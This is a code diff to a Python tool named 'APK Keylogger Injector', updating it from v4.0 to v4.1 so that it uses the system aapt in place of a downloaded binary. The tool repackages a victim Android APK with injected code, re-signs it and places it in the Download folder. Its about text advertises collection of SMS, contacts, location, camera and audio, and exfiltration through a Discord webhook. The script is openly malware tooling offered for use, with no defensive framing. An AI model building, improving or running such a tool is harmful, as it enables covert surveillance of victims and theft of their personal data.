@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
 """
 ====================================================================
-  APK KEYLOGGER INJECTOR v4.0 – Termux‑Native
-  - Uses apktool + auto‑downloaded ARM64 aapt
+  APK KEYLOGGER INJECTOR v4.1 – Uses System aapt
+  - No auto‑download (uses system aapt only)
   - Preserves all original resources
-  - Saves final APK to /sdcard/Download/
 ====================================================================
 """
 
@@ -12,11 +11,9 @@ import os
 import sys
 import subprocess
 import shutil
-import zipfile
 import uuid
 import time
 import requests
-import tempfile
 
 # ---------------------------- COLORS ----------------------------
 class Colors:
@@ -42,6 +39,8 @@ def check_dependencies():
         missing.append(('java', 'pkg install openjdk-25 -y'))
     if shutil.which('zipalign') is None:
         missing.append(('zipalign', 'pkg install zipalign -y'))
+    if shutil.which('aapt') is None:
+        missing.append(('aapt', 'pkg install aapt -y'))
     if missing:
         print_c("\n[!] Missing tools:", Colors.RED)
         for tool, cmd in missing:
@@ -62,32 +61,6 @@ def check_dependencies():
         subprocess.run([sys.executable, "-m", "pip", "install", "requests"], check=False)
         import requests
     print_c("[✓] All dependencies found.", Colors.GREEN)
-
-# ---------------------------- AAPT AUTO‑DOWNLOADER (ARM64) ----------------------------
-AAPT_DIR = os.path.join(os.path.expanduser("~"), ".aapt_bin")
-AAPT_PATH = os.path.join(AAPT_DIR, "aapt")
-
-def ensure_aapt():
-    if os.path.exists(AAPT_PATH):
-        return AAPT_PATH
-    print_c("[*] aapt not found. Downloading ARM64 static binary...", Colors.YELLOW)
-    os.makedirs(AAPT_DIR, exist_ok=True)
-    # Use the official Termux community build
-    url = "https://github.com/rendiix/termux-aapt/releases/download/v1.0/aapt"
-    try:
-        resp = requests.get(url, stream=True, timeout=60)
-        if resp.status_code != 200:
-            raise Exception("Download failed")
-        with open(AAPT_PATH, 'wb') as f:
-            for chunk in resp.iter_content(chunk_size=8192):
-                f.write(chunk)
-        os.chmod(AAPT_PATH, 0o755)
-        print_c("[✓] aapt installed at: " + AAPT_PATH, Colors.GREEN)
-        return AAPT_PATH
-    except Exception as e:
-        print_c("[!] Failed to download aapt: " + str(e), Colors.RED)
-        print_c("[!] Please manually download aapt from https://github.com/rendiix/termux-aapt/releases and place it in ~/.aapt_bin/", Colors.YELLOW)
-        sys.exit(1)
 
 # ---------------------------- KEYSTORE ----------------------------
 KEYSTORE = "mykeystore.jks"
@@ -307,7 +280,7 @@ def upload_to_cloud(filepath):
             continue
     return None
 
-# ---------------------------- INJECTION ENGINE ----------------------------
+# ---------------------------- INJECTION ENGINE (Uses System aapt) ----------------------------
 def inject_apk(input_apk, output_dir, webhook, features, interval):
     work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
     os.makedirs(work_dir, exist_ok=True)
@@ -352,13 +325,16 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
         with open(manifest_path, "w", encoding='utf-8') as f:
             f.write(manifest)
 
-        # 4. Ensure aapt is available (download if missing)
-        aapt_path = ensure_aapt()
+        # 4. Use SYSTEM aapt (no download)
+        aapt_path = shutil.which('aapt')
+        if not aapt_path:
+            raise Exception("aapt not found in PATH. Please install: pkg install aapt -y")
+        print_c(f"[*] Using system aapt: {aapt_path}", Colors.CYAN)
         env = os.environ.copy()
         env['AAPT'] = aapt_path
 
         # 5. Rebuild
-        print_c("[*] Rebuilding APK (using downloaded aapt)...", Colors.YELLOW)
+        print_c("[*] Rebuilding APK...", Colors.YELLOW)
         apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
         build_cmd = [shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned]
         result = subprocess.run(build_cmd, env=env, capture_output=True, text=True)
@@ -435,8 +411,8 @@ def clear_screen():
 def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
-    ║   APK KEYLOGGER INJECTOR v4.0            ║
-    ║   Auto‑aapt download – works in Termux   ║
+    ║   APK KEYLOGGER INJECTOR v4.1            ║
+    ║   Uses System aapt (no download)         ║
     ╚═══════════════════════════════════════════╝
     """, Colors.CYAN)
 
@@ -498,7 +474,6 @@ def inject_flow():
         elapsed = time.time() - start
         print_c(f"[✓] Injection completed in {elapsed:.1f}s", Colors.GREEN)
 
-        # Copy to /sdcard/Download/
         sdcard_download = "/sdcard/Download"
         if os.path.exists(sdcard_download):
             sdcard_apk = os.path.join(sdcard_download, os.path.basename(output_apk))
@@ -527,8 +502,8 @@ def about():
     clear_screen()
     show_banner()
     print_c("\n--- ABOUT ---", Colors.BLUE)
-    print_c("APK Keylogger Injector v4.0")
-    print_c("Uses apktool + auto‑downloaded aapt (ARM64).")
+    print_c("APK Keylogger Injector v4.1")
+    print_c("Uses system aapt (no auto‑download).")
     print_c("\nFeatures:")
     print_c("  - SMS, Contacts, Location, Camera, Audio collection")
     print_c("  - Discord webhook exfiltration")
